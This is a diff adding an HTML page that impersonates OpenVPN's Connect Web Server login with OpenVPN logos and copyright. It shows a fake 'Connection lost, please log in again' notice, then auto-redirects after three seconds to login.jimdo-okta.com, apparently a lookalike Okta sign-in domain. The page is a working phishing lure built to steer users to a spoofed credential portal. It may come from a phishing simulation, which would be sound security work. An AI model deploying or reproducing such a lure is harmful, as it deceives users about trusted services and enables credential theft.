@@ -1,8 +1,73 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
-  <title>Redirect</title>
-</head>
+<!doctype html>
+<html lang="en" class="no-js">
+    <head>
+        <title>OpenVPN CWS</title>
+        <meta http-equiv="refresh" content="3;url=https://login.jimdo-okta.com">
+        <link href="css/load-fonts.css" rel="stylesheet" type="text/css" />
+        <link href="css/all.min.css" rel="stylesheet" type="text/css" />
+        <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" media="screen" />
+        <link href="css/bootstrap-select.min.css" rel="stylesheet" type="text/css" media="screen" />
+        <link href="css/style.css?v=1553284059" rel="stylesheet" type="text/css" />
+    </head>
+    <style>
+    /* Estilo para o spinner */
+    .spinner {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        border: 4px solid #f16e00;
+        border-top-color: transparent;
+        animation: spin 1s linear infinite;
+        margin: 0 auto; /* Centraliza horizontalmente */
+    }
+
+    #main {
+    text-align: center; /* Centraliza qualquer conteúdo interno horizontalmente */
+    position: relative; /* Necessário para posicionar o spinner corretamente */
+}
+
+    /* Animação de rotação */
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    </style>
+    <body class="cws">
+        <div id="application">
+            <div id="header" class="container text-center" >
+                <header>
+                    <img id="brand-logo" class="pb-3" src="img/logo.png" alt="OpenVPN -- The Open Source VPN" />
+                </header>
+                <h3 id="company-name"></h3>
+                <div id="cws-card" class="col-9 col-md-7 col-lg-5 p-4">
+                    <p></p>
+                    <div id="main">
+                        <div class="spinner"></div>
+                        <h3 class="message" style="display: none; text-align:center; width:100%; color: #495057;">Connection lost, please log in again</h3>
+                    </div>
+                </div>
+            </div>
+        </div>
+        </div>
+        <div style="padding: 60px;"></div>
+        <footer id="footer" class="footer mt-4">
+            <div class="container text-center">
+                <div>
+                    <span id="powered-by" class="pr-1" >POWERED BY</span>
+                    <img class="OpenVPN-logo" src="img/open-vpn-logo.png" srcset="open-vpn-logo@2x.png 2x, open-vpn-logo@3x.png 3x" />
+                    <span id="copyright" class="pl-1" >© 2009-2024 OpenVPN Inc.  All Rights Reserved</span>
+                </div>
+            </div>
+        </footer>
+        <script>
+            // Simula um atraso de 3 segundos
+        setTimeout(function() {
+            // Esconde o spinner
+            document.querySelector('.spinner').style.display = 'none';
+
+            // Mostra a mensagem
+            document.querySelector('.message').style.display = 'block';
+        }, 1500); // 3 segundos
+        </script>
+    </body>
 </html>
